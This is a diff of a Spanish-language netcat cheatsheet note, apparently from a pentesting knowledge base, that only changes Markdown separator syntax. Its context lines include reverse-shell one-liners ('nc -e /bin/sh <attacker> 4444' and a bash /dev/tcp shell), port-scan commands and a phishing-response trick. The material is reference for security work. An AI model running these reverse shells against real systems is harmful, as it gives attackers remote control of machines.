@@ -13,7 +13,7 @@ linked:
 > [!info]
 > Swiss army knife de TCP/UDP. Listener, conexiones raw, transferencia archivos, reverse/bind shells. Versiones: `nc.traditional`, `nc.openbsd`, `ncat` (extendido).
 
-***
+---
 
 ## Cheatsheet
 
@@ -27,7 +27,7 @@ linked:
 | `nc -e /bin/sh <attacker> 4444` | Reverse shell (versión `-e`) | Si nc traditional |
 | `nc -lvnp 80 < response.txt` | Servir HTTP response estático | Phishing/PoC |
 
-***
+---
 
 ## Reverse shells
 
@@ -47,7 +47,7 @@ bash -i >& /dev/tcp/<attacker>/4444 0>&1
 
 Ver [[Reverse Shell]].
 
-***
+---
 
 ## Port scan
 
@@ -56,7 +56,7 @@ nc -zv <target> 1-1000  # TCP scan rápido (no flexible, usar nmap)
 nc -zuv <target> 53     # UDP probe
 ```
 
-***
+---
 
 ## Notas Relacionadas
 
